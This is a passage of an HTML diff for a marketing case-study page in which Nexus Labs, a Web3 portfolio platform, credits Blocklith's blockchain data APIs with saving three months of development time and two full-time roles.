+                  data-widget_type="icon-box.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-icon-box-wrapper">
+                      <div class="elementor-icon-box-content">
+                        <h2 class="elementor-icon-box-title">
+                          <span> SOLUTION </span>
+                        </h2>
+
+                        <p class="elementor-icon-box-description">
+                          Nexus Labs integrated Blocklith’ suite of APIs, with a
+                          primary focus on the Token API, to track ERC20 tokens
+                          and native balances across multiple chains. The
+                          cross-chain compatibility and data reliability of
+                          Blocklith provided Nexus Labs with the tools necessary
+                          to meet their needs, while also enabling future
+                          growth.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-dc9c9c6 elementor-widget-tablet__width-initial elementor-widget elementor-widget-icon-box"
+                  data-id="dc9c9c6"
+                  data-element_type="widget"
+                  data-widget_type="icon-box.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-icon-box-wrapper">
+                      <div class="elementor-icon-box-content">
+                        <h2 class="elementor-icon-box-title">
+                          <span> RESULTS </span>
+                        </h2>
+
+                        <p class="elementor-icon-box-description">
+                          By adopting Blocklith, Nexus Labs saved three months
+                          of development time, and Blocklith was able to do the
+                          work of two full-time positions. The platform now
+                          offers a seamless, multi-chain user experience with
+                          real-time data accuracy, positioning Nexus Labs to
+                          continuously innovate and enhance their service
+                          offerings.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-91c0ccf e-con-full e-flex e-con e-child"
+                data-id="91c0ccf"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-eedf8d4 content elementor-widget elementor-widget-text-editor"
+                  data-id="eedf8d4"
+                  data-element_type="widget"
+                  data-widget_type="text-editor.default"
+                >
+                  <div class="elementor-widget-container">
+                    <h2>About Nexus Labs</h2>
+                    <p>
+                      Nexus Labs is a platform in the Web3 space that caters to
+                      investors. The platform offers features like multi-asset
+                      portfolio tracking, Web3 data analytics, and launchpad
+                      services, empowering users to navigate the complexities of
+                      the Web3 ecosystem with confidence.
+                    </p>
+
+                    <h2>Nexus Labs’s Challenge</h2>
+                    <p>
+                      Nexus Labs wanted to launch a multi-asset tracker capable
+                      of providing accurate, real-time data across multiple
+                      blockchain networks. To do this, Nexus Labs needed a
+                      solution to seamlessly manage ERC20 tokens and native
+                      balances across several blockchains, including Ethereum,
+                      Polygon, Avalanche, and more. As Nexus Labs sought a
+                      long-term solution, Nexus Labs needed a reliable partner
+                      that could support its scalability and future growth for a
+                      long time.
+                    </p>
+
+                    <h2>Blocklith APIs</h2>
+                    <p>
+                      After investigating various offerings, Nexus Labs decided
+                      to use Blocklith for its blockchain data needs. This
+                      decision was based on several factors, including
+                      Blocklith’ cross-chain compatibility, Blocklith’ breadth
+                      of features and APIs, and the data reliability of
+                      Blocklith’ tools.
+                    </p>
+
+                    <p>
+                      The most central part of Blocklith’ suite of APIs for
+                      Nexus Labs is Blocklith’ Token API, which allows Nexus
+                      Labs to track ERC20 tokens and native balances across
+                      chains. However, Nexus Labs already use, or have plans to
+                      use, other current and upcoming Blocklith features.
+                    </p>
+
+                    <p>
+                      Here the full list of Blocklith tools Nexus Labs have
+                      already or will soon integrate:
+                    </p>
+
+                    <ul>
+                      <li>
+                        <strong>Token API</strong>: Enables tracking of ERC20
+                        tokens and native balances across multiple blockchains,
+                        ensuring accurate and up-to-date portfolio data.
+                      </li>
+                      <li>
+                        <strong>NFT API</strong>: For offerings insights into
+                        the rarity and value of NFTs, enhancing the trading and
+                        collecting experience.
+                      </li>
+                      <li>
+                        <strong>Discovery API</strong>: For helping users
+                        discover and understand relevant tokens.
+                      </li>
+                      <li>
+                        <strong>Bitcoin RPC</strong>: For expanding asset
+                        support, enabling comprehensive tracking of Bitcoin
+                        holdings.
+                      </li>
+                      <li>
+                        <strong>Candlesticks API</strong>: For providing
+                        detailed, time-series price data for advanced charting
+                        and analysis.
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-b05a739 e-con-full e-flex e-con e-child"
+                data-id="b05a739"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-36e544d elementor-widget elementor-widget-heading"
+                  data-id="36e544d"
+                  data-element_type="widget"
+                  data-widget_type="heading.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-heading-title elementor-size-default">
+                      SHARE
+                    </div>
+                  </div>
+                </div>
+                <div
+                  class="elementor-element elementor-element-31f7836 elementor-share-buttons--view-icon elementor-share-buttons--skin-boxed elementor-share-buttons--align-left elementor-share-buttons-mobile--align-left elementor-share-buttons--color-custom elementor-share-buttons--shape-square elementor-grid-0 elementor-widget elementor-widget-share-buttons"
+                  data-id="31f7836"
+                  data-element_type="widget"
+                  data-widget_type="share-buttons.default"
+                >
+                  <div class="elementor-widget-container">
+                    <div class="elementor-grid" role="list">
+                      <div class="elementor-grid-item" role="listitem">
+                        <div
+                          class="elementor-share-btn elementor-share-btn_linkedin"
+                          role="button"
+                          tabindex="0"
+                          aria-label="Share on linkedin"
+                        >
+                          <span class="elementor-share-btn__icon">
+                            <i class="fab fa-linkedin" aria-hidden="true"></i>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="elementor-grid-item" role="listitem">
+                        <div
+                          class="elementor-share-btn elementor-share-btn_facebook"
+                          role="button"
+                          tabindex="0"
+                          aria-label="Share on facebook"
+                        >
+                          <span class="elementor-share-btn__icon">
+                            <i class="fab fa-facebook" aria-hidden="true"></i>
+                          </span>
+                        </div>
+                      </div>
+                      <div class="elementor-grid-item" role="listitem">
+                        <div
+                          class="elementor-share-btn elementor-share-btn_twitter"
+                          role="button"
+                          tabindex="0"
+                          aria-label="Share on twitter"
+                        >
+                          <span class="elementor-share-btn__icon">
+                            <i class="fab fa-twitter" aria-hidden="true"></i>
+                          </span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-68c4b02 e-flex e-con-boxed e-con e-parent"
+            data-id="68c4b02"
+            data-element_type="container"
+            data-settings='{"background_background":"classic"}'
+          >
+            <div class="e-con-inner">
+              <div
+                class="elementor-element elementor-element-e623b58 elementor-position-left elementor-vertical-align-middle quoteBox elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box"
+                data-id="e623b58"
+                data-element_type="widget"
+                data-widget_type="icon-box.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-icon-box-wrapper">
+                    <div class="elementor-icon-box-icon">
+                      <span class="elementor-icon">
+                        <svg
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="32"
+                          height="22"
+                          viewBox="0 0 32 22"
+                          fill="none"
+                        >
+                          <g clip-path="url(#clip0_3826_461)">
+                            <path
+                              d="M31.9935 7.8354C31.9935 3.70517 28.6387 0.350342 24.5085 0.350342C20.3783 0.350342 17.0234 3.70517 17.0234 7.8354C17.0234 11.9656 20.3783 15.3205 24.5085 15.3205C25.2206 15.3205 25.9011 15.1939 26.5499 15.004C25.5371 16.7447 23.8913 18.0739 21.217 18.0739C20.1567 18.0739 19.2864 18.9443 19.2864 20.0045C19.2864 21.0648 20.1567 21.9352 21.217 21.9352C27.8633 21.9352 31.9935 16.539 31.9935 7.8354Z"
+                              fill="#99D3FF"
+                            ></path>
+                            <path
+                              d="M14.9937 7.8354C14.9937 3.70517 11.6389 0.350342 7.50869 0.350342C3.37846 0.350342 0.0078125 3.70517 0.0078125 7.8354C0.0078125 11.9656 3.36264 15.3205 7.49287 15.3205C8.20498 15.3205 8.88544 15.1939 9.53425 15.004C8.52147 16.7447 6.87571 18.0739 4.20134 18.0739C3.14109 18.0739 2.27074 18.9443 2.27074 20.0045C2.27074 21.0648 3.14109 21.9352 4.20134 21.9352C10.8477 21.9352 14.9779 16.539 14.9779 7.8354H14.9937Z"
+                              fill="#99D3FF"
+                            ></path>
+                          </g>
+                          <defs>
+                            <clipPath id="clip0_3826_461">
+                              <rect
+                                width="31.9816"
+                                height="21.6006"
+                                fill="white"
+                                transform="translate(0.0078125 0.350342)"
+                              ></rect>
+                            </clipPath>
+                          </defs>
+                        </svg>
+                      </span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-2ab0574 elementor-widget elementor-widget-text-editor"
+                data-id="2ab0574"
+                data-element_type="widget"
+                data-widget_type="text-editor.default"
+              >
+                <div class="elementor-widget-container">
+                  Blocklith saved us two full-time resources and three months of
+                  work by providing curated and comprehensive token and other
+                  blockchain data
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-411ef73 elementor-widget elementor-widget-heading"
+                data-id="411ef73"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-heading-title elementor-size-default">
+                    Joris Langewouters, Head of Product at Nexus Labs
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-a0044cf e-flex e-con-boxed e-con e-parent"
+            data-id="a0044cf"
+            data-element_type="container"
+          >
+            <div class="e-con-inner">
+              <div
+                class="elementor-element elementor-element-81f92df e-con-full elementor-hidden-mobile elementor-hidden-tablet e-flex e-con e-child"
+                data-id="81f92df"
+                data-element_type="container"
+                aria-hidden="true"
+                role="presentation"
+              ></div>
+              <div
+                class="elementor-element elementor-element-c9adb7d e-con-full e-flex e-con e-child"
+                data-id="c9adb7d"
+                data-element_type="container"
+              >
+                <div
+                  class="elementor-element elementor-element-fdcfbf6 content elementor-widget elementor-widget-text-editor"
+                  data-id="fdcfbf6"
+                  data-element_type="widget"
+                  data-widget_type="text-editor.default"
+                >
+                  <div class="elementor-widget-container">
+                    <h2>Results with Blocklith</h2>
+                    <p>
+                      Using Blocklith’ suite of blockchain data tools, Nexus
+                      Labs could reap significant benefits. Here’s how Nexus
+                      Labs achieved significant time and resource savings,
+                      enhanced user experience, and improved platform
+                      functionality using Blocklith’ APIs.
+                    </p>
+
+                    <h3>Time and Resource Savings</h3>
+                    <p>
+                      With Blocklith’ comprehensive blockchain data APIs, Nexus
+                      Labs was able to save a full three months of development
+                      time, and the equivalent of two full-time resources.
+                    </p>
+
+                    <h3>Enhanced User Experience</h3>
+                    <p>
+                      Nexus Labs users can now track ERC20 tokens and native
+                      balances across multiple blockchains with unmatched
+                      accuracy, benefiting from real-time data and advanced
+                      analytics.
+                    </p>
+
+                    <h3>Improved Platform Functionality</h3>
+                    <p>
+                      Multi-chain support and future API integrations position
+                      Nexus Labs to innovate continuously and offer users a
+                      seamless, data-rich experience.
+                    </p>
+
+                    <h2>About Blocklith</h2>
+                    <p>
+                      Blocklith is a leading crypto data provider that helps
+                      companies build great user experiences and drive
+                      engagement, growth, and revenue in their applications
+                      through Blocklith’ suite of APIs and Blocklith Nodes.
+                      These scalable, cross-chain data products – such as the
+                      <a href="/api/nft/">NFT API</a>,
+                      <a href="/api/wallet/">Wallet API</a>,
+                      <a href="/api/token/">Token API</a>,
+                      <a href="/api/price/">Price API</a>,
+                      <a href="/api/blockchain/">Blockchain API</a>,
+                      <a href="/streams/">Blocklith Streams</a>, and
+                      <a href="/nodes/">Blocklith Nodes</a> – seek to bridge the
+                      development gap between Web2 and Web3.
+                    </p>
+
+                    <h2>About Nexus Labs</h2>
+                    <p>
+                      Nexus Labs is a comprehensive platform aimed at
+                      streamlining investors’ interaction of the Web3 and NFT
+                      market. Leveraging cutting-edge technology, the platform
+                      offers a suite of functionalities that cover various needs
+                      from investors to blockchain gamers, from market data
+                      analytics and gaming portfolios to comprehensive tutorials
+                      and informational videos.
+                    </p>
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-89244f7 e-con-full elementor-hidden-tablet elementor-hidden-mobile e-flex e-con e-child"
+                data-id="89244f7"
+                data-element_type="container"
+                aria-hidden="true"
+                role="presentation"
+              ></div>
+            </div>
+          </div>
+          <div
+            class="elementor-element elementor-element-597ae7f e-con-full e-flex e-con e-parent"
+            data-id="597ae7f"
+            data-element_type="container"
+          >
+            <div
+              class="elementor-element elementor-element-e6ffcf2 elementor-widget elementor-widget-template"
+              data-id="e6ffcf2"
+              data-element_type="widget"
+              data-widget_type="template.default"
+            >
+              <div class="elementor-widget-container">
+                <div class="elementor-template">
+                  <div
+                    data-elementor-type="section"
+                    data-elementor-id="145582"
+                    class="elementor elementor-145582"
+                    data-elementor-post-type="elementor_library"
+                  >
+                    <div
+                      class="elementor-element elementor-element-a1281cb e-flex e-con-boxed e-con e-parent"
+                      data-id="a1281cb"
+                      data-element_type="container"
+                      data-settings='{"background_background":"classic"}'
+                    >
+                      <div class="e-con-inner">
+                        <div
+                          class="elementor-element elementor-element-635836c elementor-widget__width-inherit elementor-widget elementor-widget-heading"
+                          data-id="635836c"
+                          data-element_type="widget"
+                          data-widget_type="heading.default"
+                        >
+                          <div class="elementor-widget-container">
+                            <h2
+                              class="elementor-heading-title elementor-size-default"
+                            >
+                              Connect with our team
+                            </h2>
+                          </div>
+                        </div>
+                        <div
+                          class="elementor-element elementor-element-cb206c8 elementor-widget__width-inherit elementor-widget elementor-widget-heading"
+                          data-id="cb206c8"
+                          data-element_type="widget"
+                          data-widget_type="heading.default"
+                        >
+                          <div class="elementor-widget-container">
+                            <p
+                              class="elementor-heading-title elementor-size-default"
+                            >
+                              Get the power, customization you need to power
+                              your blockchain projects.
+                            </p>
+                          </div>
+                        </div>
+                        <div
+                          class="elementor-element elementor-element-9fb1f50 elementor-align-center elementor-mobile-align-center elementor-tablet-align-center elementor-widget-mobile__width-inherit elementor-widget__width-inherit elementor-widget elementor-widget-button"
+                          data-id="9fb1f50"
+                          data-element_type="widget"
+                          data-widget_type="button.default"
+                        >
+                          <div class="elementor-widget-container">
+                            <div class="elementor-button-wrapper">
+                              <a
+                                class="elementor-button elementor-button-link elementor-size-md"
+                                href="#elementor-action%3Aaction%3Dpopup%3Aopen%26settings%3DeyJpZCI6IjE1MTM0NSIsInRvZ2dsZSI6ZmFsc2V9"
+                                target="_blank"
+                                rel="nofollow"
+                              >
+                                <span class="elementor-button-content-wrapper">
+                                  <span class="elementor-button-text"
+                                    >Contact Sales</span
+                                  >
+                                </span>
+                              </a>
+                            </div>
+                          </div>
+                        </div>
+                        <div
+                          class="elementor-element elementor-element-a069559 elementor-widget__width-inherit elementor-widget-tablet__width-inherit elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list"
+                          data-id="a069559"
+                          data-element_type="widget"
+                          data-widget_type="icon-list.default"
+                        >
+                          <div class="elementor-widget-container">
+                            <ul class="elementor-icon-list-items">
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >Custom throughput limits</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >24/7 access to engineering teams</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >24/7 support and monitoring</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >Early access to new features</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >Committed use discounts</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >Marketing support</span
+                                >
+                              </li>
+                              <li class="elementor-icon-list-item">
+                                <span class="elementor-icon-list-icon">
+                                  <i
+                                    aria-hidden="true"
+                                    class="fas fa-check"
+                                  ></i>
+                                </span>
+                                <span class="elementor-icon-list-text"
+                                  >Faster metadata refreshes</span
+                                >
+                              </li>
+                            </ul>
+                          </div>
+                        </div>
+                        <div
+                          class="elementor-element elementor-element-9c9c6e6 elementor-widget elementor-widget-image"
+                          data-id="9c9c6e6"
+                          data-element_type="widget"
+                          data-widget_type="image.default"
+                        >
+                          <div class="elementor-widget-container">
+                            <a
+                              href="/security"
+                              aria-label="SOC 2 Security Page"
+                            >
+                              <img
+                                decoding="async"
+                                width="171"
+                                height="48"
+                                src="https://moralis.com/wp-content/uploads/2024/07/Soc2-Certified-v1.svg"
+                                class="attachment-large size-large wp-image-145497"
+                                alt=""
+                              />
+                            </a>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="floating-image">
+        <img
+          src="https://downloads.intercomcdn.eu/i/o/13939/630bd1c5b7a61ce68120ec3d/d56f2830b50db0381a9f5d681265a825.png"
+          alt="icon"
+        />
+      </div>
+      <div class="floating-image">
+        <img
+          src="https://downloads.intercomcdn.eu/i/o/13939/630bd1c5b7a61ce68120ec3d/d56f2830b50db0381a9f5d681265a825.png"
+          alt="icon"
+        />
+      </div>
+    </main>
+
+    <div
+      data-elementor-type="footer"
+      data-elementor-id="145779"
+      class="elementor elementor-145779 elementor-location-footer"
+      data-elementor-post-type="elementor_library"
+    >
+      <div
+        class="elementor-element elementor-element-e0fda32 e-flex e-con-boxed e-con e-parent dark"
+        data-id="e0fda32"
+        data-element_type="container"
+        id="m_footer"
+      >
+        <div class="e-con-inner">
+          <div
+            class="elementor-element elementor-element-65a55c2 e-con-full e-flex e-con e-child"
+            data-id="65a55c2"
+            data-element_type="container"
+          >
+            <div
+              class="elementor-element elementor-element-b18c1ba e-con-full e-flex e-con e-child"
+              data-id="b18c1ba"
+              data-element_type="container"
+            >
+              <div
+                class="elementor-element elementor-element-a1deabd m_footer_heading elementor-widget elementor-widget-heading"
+                data-id="a1deabd"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-heading-title elementor-size-default">
+                    Products
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-3850887 elementor-nav-menu__align-start m_footer_options elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu"
+                data-id="3850887"
+                data-element_type="widget"
+                data-settings='{"layout":"vertical","submenu_icon":{"value":"<i class=\"\"><\/i>","library":""}}'
+                data-widget_type="nav-menu.default"
+              >
+                <div class="elementor-widget-container">
+                  <nav
+                    aria-label="Menu"
+                    class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-none"
+                  >
+                    <ul
+                      id="menu-1-3850887"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="17530836116166"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154251"
+                      >
+                        <a href="/cortex" class="elementor-item"
+                          ><span style="width: 100%"
+                            >Cortex <span class="labelSpan">new</span></span
+                          ></a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109394"
+                      >
+                        <a href="/streams" class="elementor-item"
+                          >Streams API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109395"
+                      >
+                       <a href="/authentication" class="elementor-item"
+                          >Authentication</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                  <nav
+                    class="elementor-nav-menu--dropdown elementor-nav-menu__container"
+                    aria-hidden="true"
+                  >
+                    <ul
+                      id="menu-2-3850887"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="17530836116177292"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-154251"
+                      >
+                        <a href="/cortex/" class="elementor-item" tabindex="-1"
+                          ><span style="width: 100%"
+                            >Cortex <span class="labelSpan">new</span></span
+                          ></a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109394"
+                      >
+                        <a href="/streams/" class="elementor-item" tabindex="-1"
+                          >Streams API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109395"
+                      >
+                        <a
+                          href="/authentication/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Authentication</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-2166a5b m_footer_heading elementor-widget elementor-widget-heading"
+                data-id="2166a5b"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-heading-title elementor-size-default">
+                    Web3 Data
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-075061d elementor-nav-menu__align-start m_footer_options elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu"
+                data-id="075061d"
+                data-element_type="widget"
+                data-settings='{"layout":"vertical","submenu_icon":{"value":"<i class=\"\"><\/i>","library":""}}'
+                data-widget_type="nav-menu.default"
+              >
+                <div class="elementor-widget-container">
+                  <nav
+                    aria-label="Menu"
+                    class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-none"
+                  >
+                    <ul
+                      id="menu-1-075061d"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="1753083611619924"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109373"
+                      >
+                        <a href="/api/nft/" class="elementor-item">NFT API</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121980"
+                      >
+                        <a href="/api/price/" class="elementor-item"
+                          >Price API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109374"
+                      >
+                        <a href="/api/token/" class="elementor-item"
+                          >Token API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121243"
+                      >
+                        <a href="/api/wallet/" class="elementor-item"
+                          >Wallet API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-125249"
+                      >
+                        <a href="/api/blockchain/" class="elementor-item"
+                          >Blockchain API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115491"
+                      >
+                        <a href="/api/defi/" class="elementor-item">DeFi API</a>
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-153448"
+                      >
+                        <a href="/api/token-search/" class="elementor-item"
+                          ><span style="width: 100%"
+                            >Token Search API
+                            <span class="labelSpan">new</span></span
+                          ></a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                  <nav
+                    class="elementor-nav-menu--dropdown elementor-nav-menu__container"
+                    aria-hidden="true"
+                  >
+                    <ul
+                      id="menu-2-075061d"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="1753083611619926"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109373"
+                      >
+                        <a href="/api/nft/" class="elementor-item" tabindex="-1"
+                          >NFT API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121980"
+                      >
+                        <a
+                          href="/api/price/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Price API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-109374"
+                      >
+                        <a
+                          href="/api/token/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Token API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121243"
+                      >
+                        <a
+                          href="/api/wallet/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Wallet API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-125249"
+                      >
+                        <a
+                          href="/api/blockchain/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Blockchain API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-115491"
+                      >
+                        <a
+                          href="/api/defi/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >DeFi API</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-153448"
+                      >
+                        <a
+                          href="/api/token-search/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          ><span style="width: 100%"
+                            >Token Search API
+                            <span class="labelSpan">new</span></span
+                          ></a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-9dabf45 m_footer_heading elementor-widget elementor-widget-heading"
+                data-id="9dabf45"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-heading-title elementor-size-default">
+                    Solutions
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-3c6370b elementor-nav-menu__align-start m_footer_options elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu"
+                data-id="3c6370b"
+                data-element_type="widget"
+                data-settings='{"layout":"vertical","submenu_icon":{"value":"<i class=\"\"><\/i>","library":""}}'
+                data-widget_type="nav-menu.default"
+              >
+                <div class="elementor-widget-container">
+                  <nav
+                    aria-label="Menu"
+                    class="elementor-nav-menu--main elementor-nav-menu__container elementor-nav-menu--layout-vertical e--pointer-none"
+                  >
+                    <ul
+                      id="menu-1-3c6370b"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="1753083611622045"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143644"
+                      >
+                        <a href="/solutions/wallets/" class="elementor-item"
+                          >Wallets</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143643"
+                      >
+                        <a href="/solutions/crypto-tax/" class="elementor-item"
+                          >Crypto Tax</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143642"
+                      >
+                        <a href="/solutions/defi/" class="elementor-item"
+                          >DeFi</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151874"
+                      >
+                        <a href="/api/web3-ai-agents/" class="elementor-item"
+                          >Web3 AI Agents</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-153878"
+                      >
+                        <a
+                          href="/solutions/crypto-neobank/"
+                          class="elementor-item"
+                          >Crypto Neobank</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                  <nav
+                    class="elementor-nav-menu--dropdown elementor-nav-menu__container"
+                    aria-hidden="true"
+                  >
+                    <ul
+                      id="menu-2-3c6370b"
+                      class="elementor-nav-menu sm-vertical"
+                      data-smartmenus-id="17530836116226748"
+                    >
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143644"
+                      >
+                        <a
+                          href="/solutions/wallets/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Wallets</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143643"
+                      >
+                        <a
+                          href="/solutions/crypto-tax/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Crypto Tax</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-143642"
+                      >
+                        <a
+                          href="/solutions/defi/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >DeFi</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-page menu-item-151874"
+                      >
+                        <a
+                          href="/api/web3-ai-agents/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Web3 AI Agents</a
+                        >
+                      </li>
+                      <li
+                        class="menu-item menu-item-type-post_type menu-item-object-solutions menu-item-153878"
+                      >
+                        <a
+                          href="/solutions/crypto-neobank/"
+                          class="elementor-item"
+                          tabindex="-1"
+                          >Crypto Neobank</a
+                        >
+                      </li>
+                    </ul>
+                  </nav>
+                </div>
+              </div>
+            </div>
+            <div
+              class="elementor-element elementor-element-1f85bbf e-con-full e-flex e-con e-child"
+              data-id="1f85bbf"
+              data-element_type="container"
+            >
+              <div
+                class="elementor-element elementor-element-95d0669 m_footer_heading elementor-widget elementor-widget-heading"
+                data-id="95d0669"
+                data-element_type="widget"
+                data-widget_type="heading.default"
+              >
+                <div class="elementor-widget-container">
+                  <div class="elementor-heading-title elementor-size-default">
+                    Chains
+                  </div>
+                </div>
+              </div>
+              <div
+                class="elementor-element elementor-element-63ac917 elementor-nav-menu__align-start m_footer_options elementor-nav-menu--dropdown-none elementor-widget elementor-widget-nav-menu"
+                data-id="63ac917"
+                data-element_type="widget"
+                data-settings='{"layout":"vertical","submenu_icon":{"value":"<i class=\"\"><\/i>","library":""}}'
+                data-widget_type="nav-menu.default"
+              >
+                <div class="elementor-widget-container">
+                  <nav
+                    aria-label="Menu"
